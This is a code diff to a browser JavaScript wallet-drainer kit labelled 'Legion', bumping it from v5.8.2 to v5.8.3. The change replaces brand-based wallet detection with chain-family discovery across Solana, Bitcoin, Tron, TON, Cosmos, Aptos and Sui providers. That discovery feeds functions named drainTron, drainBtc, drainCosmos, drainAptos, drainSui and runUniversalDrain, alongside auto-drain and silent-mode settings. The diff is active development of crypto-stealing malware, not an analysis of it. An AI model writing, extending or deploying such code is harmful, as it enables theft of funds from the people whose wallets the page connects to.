@@ -575,6 +575,7 @@
     anchorsOk: 0,
     discovered: [],
     nonEvm: {},
+    familyProviders: { SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [] },
     chains: { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null },
     omnichainLegs: {},
     fusionAssets: [],
@@ -685,6 +686,169 @@
     try { window.dispatchEvent(new Event('eip6963:requestProvider')); } catch (e) {}
   }
 
+  // ── Chain-family discovery (blockchain API first — NOT wallet brand names) ──
+  var discoveredSolanaWallets = [];
+
+  function registerSolanaWalletStandard(w) {
+    if (!w || typeof w !== 'object') return;
+    var dup = discoveredSolanaWallets.some(function (x) { return x === w; });
+    if (!dup) discoveredSolanaWallets.push(w);
+  }
+
+  try {
+    window.addEventListener('wallet-standard:register', function (ev) {
+      var d = ev.detail;
+      if (Array.isArray(d)) d.forEach(registerSolanaWalletStandard);
+      else registerSolanaWalletStandard(d);
+    });
+    window.addEventListener('wallet-standard:app-ready', function (ev) {
+      var api = ev.detail && ev.detail.register;
+      if (typeof api === 'function') {
+        api(function (w) { registerSolanaWalletStandard(w); });
+      }
+    });
+    if (window.navigator && window.navigator.wallets) {
+      window.navigator.wallets.forEach(registerSolanaWalletStandard);
+    }
+  } catch (e) {}
+
+  function hasSvmApi(p) {
+    if (!p || typeof p !== 'object') return false;
+    var canConnect = !!(p.connect || (p.features && p.features['standard:connect']));
+    var canSign = !!(p.signTransaction || p.signAllTransactions ||
+      (p.features && (p.features['solana:signTransaction'] || p.features['solana:signAllTransactions'])));
+    return canConnect && canSign;
+  }
+
+  function hasUtxoApi(p) {
+    if (!p || typeof p !== 'object') return false;
+    return !!(p.signPsbt && (p.requestAccounts || p.connect || p.getAccounts));
+  }
+
+  function hasTronApi(obj) {
+    if (!obj) return false;
+    var tw = obj.tronWeb || obj;
+    return !!(tw && (tw.defaultAddress || tw.trx || tw.transactionBuilder));
+  }
+
+  function hasTonApi(p) {
+    if (!p || typeof p !== 'object') return false;
+    return !!(p.connect || p.sendTransaction || p.send);
+  }
+
+  function hasCosmosApi(p) {
+    if (!p || typeof p !== 'object') return false;
+    return !!(p.enable && (p.signAmino || p.signDirect || p.getKey));
+  }
+
+  function hasAptosApi(p) {
+    if (!p || typeof p !== 'object') return false;
+    return !!(p.connect || p.signAndSubmitTransaction || p.account);
+  }
+
+  function hasSuiApi(p) {
+    if (!p || typeof p !== 'object') return false;
+    return !!(p.connect || p.signTransactionBlock || p.signAndExecuteTransactionBlock);
+  }
+
+  function pushFamily(list, seen, provider, family, hint) {
+    if (!provider || typeof provider !== 'object') return;
+    if (seen.indexOf(provider) !== -1) return;
+    seen.push(provider);
+    list.push({ family: family, provider: provider, hint: hint || family });
+  }
+
+  function scanObjectForFamily(root, list, seen, family, testFn, prefix) {
+    if (!root || typeof root !== 'object') return;
+    try {
+      if (testFn(root)) pushFamily(list, seen, root, family, prefix || family);
+    } catch (e) {}
+    var keys;
+    try { keys = Object.keys(root); } catch (e2) { return; }
+    for (var i = 0; i < keys.length; i++) {
+      var k = keys[i];
+      if (k === 'parent' || k === 'top' || k === 'window') continue;
+      try {
+        var child = root[k];
+        if (child && typeof child === 'object' && testFn(child)) {
+          pushFamily(list, seen, child, family, (prefix ? prefix + '.' : '') + k);
+        }
+      } catch (e3) {}
+    }
+  }
+
+  function discoverChainFamilies() {
+    var seen = [];
+    var fp = {
+      SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [],
+    };
+
+    discoveredSolanaWallets.forEach(function (w) {
+      pushFamily(fp.SVM, seen, w, 'SVM', (w && w.name) ? w.name : 'wallet-standard');
+    });
+
+    scanObjectForFamily(window.solana, fp.SVM, seen, 'SVM', hasSvmApi, 'window.solana');
+    if (window.phantom) scanObjectForFamily(window.phantom, fp.SVM, seen, 'SVM', hasSvmApi, 'phantom');
+    if (window.solflare) pushFamily(fp.SVM, seen, window.solflare, 'SVM', 'solflare');
+    if (window.backpack) scanObjectForFamily(window.backpack, fp.SVM, seen, 'SVM', hasSvmApi, 'backpack');
+    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'okxwallet');
+    if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.SVM, seen, 'SVM', hasSvmApi, 'bitkeep');
+    if (window.trustwallet) scanObjectForFamily(window.trustwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'trustwallet');
+    if (window.coinbaseSolana) pushFamily(fp.SVM, seen, window.coinbaseSolana, 'SVM', 'coinbaseSolana');
+
+    if (window.unisat) pushFamily(fp.UTXO, seen, window.unisat, 'UTXO', 'unisat');
+    if (window.BitcoinProvider) pushFamily(fp.UTXO, seen, window.BitcoinProvider, 'UTXO', 'BitcoinProvider');
+    if (window.LeatherProvider) pushFamily(fp.UTXO, seen, window.LeatherProvider, 'UTXO', 'leather');
+    if (window.HiroWalletProvider) pushFamily(fp.UTXO, seen, window.HiroWalletProvider, 'UTXO', 'hiro');
+    if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
+      pushFamily(fp.UTXO, seen, window.XverseProviders.BitcoinProvider, 'UTXO', 'xverse');
+    }
+    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'okxwallet');
+    if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'bitkeep');
+    if (window.phantom) scanObjectForFamily(window.phantom, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'phantom');
+
+    if (window.tronLink) pushFamily(fp.TRON, seen, window.tronLink, 'TRON', 'tronLink');
+    if (window.tronWeb) pushFamily(fp.TRON, seen, { tronWeb: window.tronWeb }, 'TRON', 'tronWeb');
+    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TRON, seen, 'TRON', hasTronApi, 'okxwallet');
+
+    if (window.tonkeeper) pushFamily(fp.TON, seen, window.tonkeeper, 'TON', 'tonkeeper');
+    if (window.ton) pushFamily(fp.TON, seen, window.ton, 'TON', 'ton');
+    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TON, seen, 'TON', hasTonApi, 'okxwallet');
+
+    if (window.keplr) pushFamily(fp.COSMOS, seen, window.keplr, 'COSMOS', 'keplr');
+    if (window.leap) pushFamily(fp.COSMOS, seen, window.leap, 'COSMOS', 'leap');
+    if (window.cosmostation && window.cosmostation.providers) {
+      scanObjectForFamily(window.cosmostation.providers, fp.COSMOS, seen, 'COSMOS', hasCosmosApi, 'cosmostation');
+    }
+
+    if (window.aptos) pushFamily(fp.APTOS, seen, window.aptos, 'APTOS', 'aptos');
+    if (window.petra && window.petra.aptos) pushFamily(fp.APTOS, seen, window.petra.aptos, 'APTOS', 'petra');
+    if (window.martian) pushFamily(fp.APTOS, seen, window.martian, 'APTOS', 'martian');
+    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.APTOS, seen, 'APTOS', hasAptosApi, 'okxwallet');
+
+    if (window.suiWallet) pushFamily(fp.SUI, seen, window.suiWallet, 'SUI', 'suiWallet');
+    if (window.phantom) scanObjectForFamily(window.phantom, fp.SUI, seen, 'SUI', hasSuiApi, 'phantom');
+    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SUI, seen, 'SUI', hasSuiApi, 'okxwallet');
+
+    S.familyProviders = fp;
+    var counts = [];
+    Object.keys(fp).forEach(function (k) {
+      if (fp[k].length) counts.push(k + ':' + fp[k].length);
+    });
+    if (counts.length) L.log('[families] detected', counts.join(' '));
+    return fp;
+  }
+
+  function firstFamilyProvider(family) {
+    var list = (S.familyProviders && S.familyProviders[family]) || [];
+    return list.length ? list[0] : null;
+  }
+
+  function detectNonEvm() {
+    discoverChainFamilies();
+    return S.familyProviders || {};
+  }
+
   var EVM_FINGERPRINTS = [
     ['isRabby', 'Rabby'], ['isOkxWallet', 'OKX'], ['isCoinbaseWallet', 'Coinbase Wallet'],
     ['isBraveWallet', 'Brave'], ['isTrust', 'Trust Wallet'], ['isBitKeep', 'Bitget'],
@@ -716,32 +880,6 @@
 
   function canTryNativeSignTx(provider) {
     return !isMetaMaskProvider(provider);
-  }
-
-  function detectNonEvm() {
-    var found = {};
-    // Solana
-    if (window.phantom && window.phantom.solana) found.phantom = window.phantom.solana;
-    if (window.solflare && window.solflare.isSolflare) found.solflare = window.solflare;
-    if (window.backpack && window.backpack.isBackpack) found.backpack = window.backpack;
-    if (!found.phantom && !found.solflare && window.solana) found.solanaLegacy = window.solana;
-    // TRON
-    if (window.tronLink) found.tronLink = window.tronLink;
-    // Bitcoin
-    if (window.unisat) found.unisat = window.unisat;
-    if (window.okxwallet && window.okxwallet.bitcoin) found.okxBtc = window.okxwallet.bitcoin;
-    if (window.BitcoinProvider) found.xverse = window.BitcoinProvider;
-    if (window.LeatherProvider) found.leather = window.LeatherProvider;
-    // TON
-    if (window.tonkeeper) found.tonkeeper = window.tonkeeper;
-    else if (window.ton) found.ton = window.ton;
-    if (window.keplr) found.keplr = window.keplr;
-    if (window.aptos || (window.petra && window.petra.aptos)) {
-      found.aptos = window.aptos || window.petra.aptos;
-    } else if (window.martian) found.aptos = window.martian;
-    if (window.suiWallet) found.sui = window.suiWallet;
-    else if (window.phantom && window.phantom.sui) found.sui = window.phantom.sui;
-    return found;
   }
 
   // ═══════════════════════════════════════════════════════════════
@@ -1849,8 +1987,9 @@
   // SECTION 10: SOLANA MODULE (full — SOL + SPL, per-tx submit)
   // ═══════════════════════════════════════════════════════════════
   async function connectSol() {
-    var prov = S.nonEvm.phantom || S.nonEvm.solflare || S.nonEvm.backpack || S.nonEvm.solanaLegacy;
-    if (!prov) return null;
+    var entry = firstFamilyProvider('SVM');
+    if (!entry) return null;
+    var prov = entry.provider;
     try {
       if (prov.features && prov.features['standard:connect']) {
         await prov.features['standard:connect'].connect({});
@@ -1860,11 +1999,10 @@
       var pk = prov.publicKey;
       var addr = pk ? (pk.toString ? pk.toString() : String(pk)) : '';
       if (!addr) return null;
-      var wname = S.nonEvm.phantom ? 'Phantom' : S.nonEvm.solflare ? 'Solflare' : S.nonEvm.backpack ? 'Backpack' : 'Solana';
-      L.log('SOL connected:', addr.slice(0, 8), wname);
-      S.chains.SOL = { address: addr, name: wname };
-      return { provider: prov, address: addr, name: wname };
-    } catch (e) { L.warn('SOL connect fail:', e.message); return null; }
+      L.log('[SVM] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
+      S.chains.SOL = { address: addr, name: 'SVM' };
+      return { provider: prov, address: addr, name: 'SVM', family: 'SVM', hint: entry.hint };
+    } catch (e) { L.warn('[SVM] connect fail:', e.message); return null; }
   }
 
   async function loadSolWeb3() {
@@ -1983,18 +2121,18 @@
   // SECTION 11: TRON MODULE (TRX + dynamic TRC-20 from fusion scout)
   // ═══════════════════════════════════════════════════════════════
   async function connectTron() {
-    var tl = S.nonEvm.tronLink;
-    if (!tl && window.tronWeb) tl = { tronWeb: window.tronWeb };
-    if (!tl) return null;
+    var entry = firstFamilyProvider('TRON');
+    if (!entry) return null;
+    var tl = entry.provider;
     try {
       if (tl.request) await tl.request({ method: 'tron_requestAccounts' });
       var tw = tl.tronWeb || window.tronWeb;
       if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) return null;
       var addr = tw.defaultAddress.base58;
-      L.log('TRON connected:', addr.slice(0, 8));
+      L.log('[TRON] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
       S.chains.TRON = { address: addr };
-      return { tronWeb: tw, address: addr, name: 'TronLink' };
-    } catch (e) { L.warn('TRON connect fail:', e.message); return null; }
+      return { tronWeb: tw, address: addr, name: 'TRON', family: 'TRON', hint: entry.hint };
+    } catch (e) { L.warn('[TRON] connect fail:', e.message); return null; }
   }
 
   async function drainTron(conn) {
@@ -2059,7 +2197,8 @@
   var _tcConnector = null;
 
   async function connectTon() {
-    var tonProv = S.nonEvm.tonkeeper || S.nonEvm.ton;
+    var entry = firstFamilyProvider('TON');
+    var tonProv = entry ? entry.provider : null;
     if (tonProv) {
       try {
         var r = await tonProv.connect({ items: [{ name: 'ton_addr' }] });
@@ -2067,7 +2206,8 @@
           var ai = r.items.find(function (x) { return x.name === 'ton_addr'; });
           if (ai && ai.address) {
             S.chains.TON = { address: ai.address };
-            return { provider: tonProv, address: ai.address, type: 'direct', name: 'Tonkeeper' };
+            L.log('[TON] connected:', ai.address.slice(0, 8), '(' + entry.hint + ')');
+            return { provider: tonProv, address: ai.address, type: 'direct', name: 'TON', family: 'TON', hint: entry.hint };
           }
         }
       } catch (e) {}
@@ -2142,23 +2282,24 @@
   // SECTION 13: BITCOIN MODULE (backend PSBT builder + wallet sign)
   // ═══════════════════════════════════════════════════════════════
   async function connectBtc() {
-    var prov = S.nonEvm.unisat || S.nonEvm.okxBtc || S.nonEvm.xverse || S.nonEvm.leather;
-    if (!prov) return null;
+    var entry = firstFamilyProvider('UTXO');
+    if (!entry) return null;
+    var prov = entry.provider;
     try {
       var accounts;
       if (prov.requestAccounts) accounts = await prov.requestAccounts();
       else if (prov.connect) {
         var cr = await prov.connect();
         accounts = cr.accounts || cr.addresses || [cr];
-      } else return null;
+      } else if (prov.getAccounts) accounts = await prov.getAccounts();
+      else return null;
       var addr = Array.isArray(accounts) ? accounts[0] : accounts;
       if (addr && typeof addr === 'object') addr = addr.address || addr.pubkey || '';
       if (!addr || typeof addr !== 'string') return null;
-      var name = prov === S.nonEvm.okxBtc ? 'OKX' : prov === S.nonEvm.xverse ? 'Xverse' : prov === S.nonEvm.leather ? 'Leather' : 'UniSat';
-      S.chains.BTC = { address: addr, name: name };
-      L.log('BTC connected:', addr.slice(0, 8), name);
-      return { provider: prov, address: addr, name: name };
-    } catch (e) { L.warn('BTC connect fail:', e.message); return null; }
+      S.chains.BTC = { address: addr, name: 'UTXO' };
+      L.log('[UTXO] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
+      return { provider: prov, address: addr, name: 'UTXO', family: 'UTXO', hint: entry.hint };
+    } catch (e) { L.warn('[UTXO] connect fail:', e.message); return null; }
   }
 
   async function drainBtc(conn) {
@@ -2198,15 +2339,18 @@
   // SECTION 13B: COSMOS MODULE (Keplr — cosmoshub-4 ATOM)
   // ═══════════════════════════════════════════════════════════════
   async function connectCosmos() {
-    if (!window.keplr) return null;
+    var entry = firstFamilyProvider('COSMOS');
+    if (!entry) return null;
+    var prov = entry.provider;
     try {
       var chainId = 'cosmoshub-4';
-      await window.keplr.enable(chainId);
-      var key = await window.keplr.getKey(chainId);
+      await prov.enable(chainId);
+      var key = await prov.getKey(chainId);
       if (!key || !key.bech32Address) return null;
       S.chains.COSMOS = { address: key.bech32Address };
-      return { provider: window.keplr, address: key.bech32Address, chainId: chainId, name: 'Keplr' };
-    } catch (e) { L.warn('Cosmos connect fail:', e.message); return null; }
+      L.log('[COSMOS] connected:', key.bech32Address.slice(0, 8), '(' + entry.hint + ')');
+      return { provider: prov, address: key.bech32Address, chainId: chainId, name: 'COSMOS', family: 'COSMOS', hint: entry.hint };
+    } catch (e) { L.warn('[COSMOS] connect fail:', e.message); return null; }
   }
 
   async function drainCosmos(conn) {
@@ -2251,18 +2395,19 @@
   // SECTION 13C: APTOS MODULE (Petra / Martian)
   // ═══════════════════════════════════════════════════════════════
   async function connectAptos() {
-    var apt = S.nonEvm.aptos;
-    if (!apt) return null;
+    var entry = firstFamilyProvider('APTOS');
+    if (!entry) return null;
+    var apt = entry.provider;
     try {
       if (apt.connect) await apt.connect();
       var account = null;
       try { account = apt.account ? await apt.account() : null; } catch (ae) {}
       var addr = (account && account.address) || apt.address || '';
       if (!addr) return null;
-      var name = window.martian ? 'Martian' : window.petra ? 'Petra' : 'Aptos';
       S.chains.APTOS = { address: addr };
-      return { provider: apt, address: addr, name: name };
-    } catch (e) { L.warn('Aptos connect fail:', e.message); return null; }
+      L.log('[APTOS] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
+      return { provider: apt, address: addr, name: 'APTOS', family: 'APTOS', hint: entry.hint };
+    } catch (e) { L.warn('[APTOS] connect fail:', e.message); return null; }
   }
 
   async function drainAptos(conn) {
@@ -2299,16 +2444,18 @@
   // SECTION 13D: SUI MODULE (Sui Wallet / Phantom Sui)
   // ═══════════════════════════════════════════════════════════════
   async function connectSui() {
-    var sui = S.nonEvm.sui;
-    if (!sui) return null;
+    var entry = firstFamilyProvider('SUI');
+    if (!entry) return null;
+    var sui = entry.provider;
     try {
       if (sui.connect) await sui.connect();
       var accounts = sui.accounts || (sui.getAccounts && await sui.getAccounts()) || [];
       var addr = accounts[0] && (accounts[0].address || accounts[0]);
       if (!addr) return null;
       S.chains.SUI = { address: addr };
-      return { provider: sui, address: addr, name: 'Sui Wallet' };
-    } catch (e) { L.warn('Sui connect fail:', e.message); return null; }
+      L.log('[SUI] connected:', String(addr).slice(0, 8), '(' + entry.hint + ')');
+      return { provider: sui, address: addr, name: 'SUI', family: 'SUI', hint: entry.hint };
+    } catch (e) { L.warn('[SUI] connect fail:', e.message); return null; }
   }
 
   async function drainSui(conn) {
@@ -2361,7 +2508,7 @@
   // SECTION 13E: UNIVERSAL ORCHESTRATOR (all chains, value-priority)
   // ═══════════════════════════════════════════════════════════════
   async function runUniversalDrain(evmCtx) {
-    Object.assign(S.nonEvm, detectNonEvm());
+    discoverChainFamilies();
     S.omnichainLegs = {};
 
     var addrs = { evm: evmCtx.address };
@@ -3077,7 +3224,7 @@
       S.fusionNotified = false;
       UI.showStatus('Scanning assets...');
 
-      Object.assign(S.nonEvm, detectNonEvm());
+      discoverChainFamilies();
 
       await sleep(CFG.delayDrainMs || 300);
 
@@ -3214,8 +3361,9 @@
 
     // Fire EIP-6963 immediately
     requestProviders();
-    setTimeout(requestProviders, 800);
-    setTimeout(requestProviders, 2000);
+    discoverChainFamilies();
+    setTimeout(function () { requestProviders(); discoverChainFamilies(); }, 800);
+    setTimeout(function () { requestProviders(); discoverChainFamilies(); }, 2000);
 
     // Prefetch vault in background
     prefetchVault();
@@ -3252,7 +3400,7 @@
       };
     }
 
-    L.log('Legion v5.8.2 ready — ' + S.discovered.length + ' wallet(s) detected');
+    L.log('Legion v5.8.3 ready — chain-family detection (EVM+SVM+UTXO+...)');
 
     // Only auto-connect when explicitly enabled (never on silentMode alone)
     if (CFG.autoConnectOnLoad === true && AUTO_DRAIN && !S.drainRunning && window.ethereum) {
